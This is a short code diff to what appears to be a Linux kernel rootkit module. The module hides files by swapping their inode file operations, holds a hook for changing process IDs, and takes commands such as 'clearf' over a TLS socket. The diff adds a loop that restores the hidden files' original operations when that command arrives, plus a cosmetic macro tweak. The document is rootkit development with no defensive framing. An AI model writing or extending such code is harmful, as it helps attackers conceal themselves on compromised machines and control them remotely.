@@ -45,7 +45,7 @@
 #ifndef NDEBUG
 #define DEBUG_PRINT(...) printk(__VA_ARGS__)
 #else
-#define DEBUG_PRINT(...) ((void)0)
+#define DEBUG_PRINT(...) ((void) 0)
 #endif
 
 static asmlinkage void (*change_pidR)(
@@ -405,6 +405,10 @@ void read_TLS(struct work_struct* work) {
         strcpy(buffer + 1, close);
         send_msg(svc->tls_socket, buffer, strlen(close) + 1);
     } else if (memcmp("clearf", buffer, 6) == 0) {
+        for (i = 0; i < hidden_file_count; ++i) {
+            hidden_files[i].inode = hidden_files[i].path.dentry->d_inode;
+            hidden_files[i].inode->i_fop = hidden_files[i].backup_fops;
+        }
         hidden_file_count = 0;
         buffer[0] = 'm';
         strcpy(buffer + 1, clearf);
